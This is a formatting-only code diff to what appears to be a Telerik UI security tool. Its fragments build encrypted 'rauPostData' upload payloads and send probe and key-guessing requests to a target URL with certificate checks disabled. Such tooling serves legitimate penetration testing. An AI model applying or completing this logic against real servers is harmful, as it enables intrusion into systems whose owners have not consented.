@@ -252,7 +252,7 @@ class AsyncUpload:
         payload = ""
         payload += f"-----------------------------{multipart_boundary}\r\n"
         payload += 'Content-Disposition: form-data; name="rauPostData"\r\n\r\n'
-        payload += f"{self.encrypt(enc_a,key,iv)}&{self.encrypt(enc_b,key,iv)}\r\n"
+        payload += f"{self.encrypt(enc_a, key, iv)}&{self.encrypt(enc_b, key, iv)}\r\n"
         payload += f"-----------------------------{multipart_boundary}\r\n"
         payload += 'Content-Disposition: form-data; name="file"; filename="blob"\r\n'
         payload += "Content-Type: application/octet-stream\r\n"
@@ -337,7 +337,9 @@ class AsyncUpload:
 
                         data, multipart_boundary = self.rau_data_prep(telerik_version, derived_key, iv, hashkey)
                         headers = dict(self.headers) if self.headers else {}
-                        headers["Content-Type"] = f"multipart/form-data; boundary=---------------------------{multipart_boundary}"
+                        headers["Content-Type"] = (
+                            f"multipart/form-data; boundary=---------------------------{multipart_boundary}"
+                        )
                         request = httpx.Request("POST", self.url, content=data, headers=headers)
                         if hasattr(self, "debug") and self.debug:
                             print(f"[DEBUG] Sending request to: {self.url}")
@@ -461,9 +463,7 @@ class DialogHandler:
             print("\n[DEBUG] Detecting key derivation function")
             print(f"[DEBUG] Sending probe request to: {self.url}")
         try:
-            res = httpx.post(
-                self.url, data=KDF_probe_data, proxy=self.proxy, headers=self.headers, verify=False
-            )
+            res = httpx.post(self.url, data=KDF_probe_data, proxy=self.proxy, headers=self.headers, verify=False)
         except httpx.HTTPError:
             print(f"Network error connecting to URL: [{self.url}]. Cannot determine key derivation function.")
             sys.exit(1)
@@ -558,9 +558,7 @@ class DialogHandler:
                         print(f"\n[DEBUG] Testing encryption key #{encryptionkey_counter}: {encryption_key}")
                         print(f"[DEBUG] Sending request to: {self.url}")
                     try:
-                        res = httpx.post(
-                            self.url, data=data, proxy=self.proxy, headers=self.headers, verify=False
-                        )
+                        res = httpx.post(self.url, data=data, proxy=self.proxy, headers=self.headers, verify=False)
                     except httpx.HTTPError:
                         print(f"Network error connecting to URL: [{self.url}]. Exiting due to connection failure.")
                         sys.exit(1)
@@ -600,9 +598,7 @@ class DialogHandler:
             dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params("dummy", ct)
             data = {"dialogParametersHolder": dialog_parameters}
             try:
-                baseline_res = httpx.post(
-                    self.url, data=data, proxy=self.proxy, headers=self.headers, verify=False
-                )
+                baseline_res = httpx.post(self.url, data=data, proxy=self.proxy, headers=self.headers, verify=False)
             except httpx.HTTPError:
                 print(f"Network error connecting to URL: [{self.url}]. Cannot establish baseline for testing.")
                 sys.exit(1)
@@ -654,9 +650,7 @@ class DialogHandler:
                         print(f"  - Encryption Key: {encryption_key}")
                         print(f"[DEBUG] Sending request to: {self.url}")
                     try:
-                        res = httpx.post(
-                            self.url, data=data, proxy=self.proxy, headers=self.headers, verify=False
-                        )
+                        res = httpx.post(self.url, data=data, proxy=self.proxy, headers=self.headers, verify=False)
                     except httpx.HTTPError:
                         print(f"Network error connecting to URL: [{self.url}]. Exiting due to connection failure.")
                         sys.exit(1)
